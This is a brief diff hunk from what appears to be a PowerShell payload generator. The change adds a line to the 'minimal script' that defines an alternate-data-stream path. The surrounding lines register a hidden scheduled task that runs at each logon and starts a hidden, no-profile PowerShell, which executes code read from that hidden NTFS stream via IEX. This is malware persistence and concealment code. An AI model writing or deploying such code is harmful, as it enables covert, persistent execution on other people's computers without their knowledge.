@@ -258,6 +258,7 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
         # Unencrypted task
 $minimalScript += @"
 # Scheduled task
+`$adsPath=$hp+':'+$sn
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"IEX([IO.File]::ReadAllText(`$hp+':'+`$sn))`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
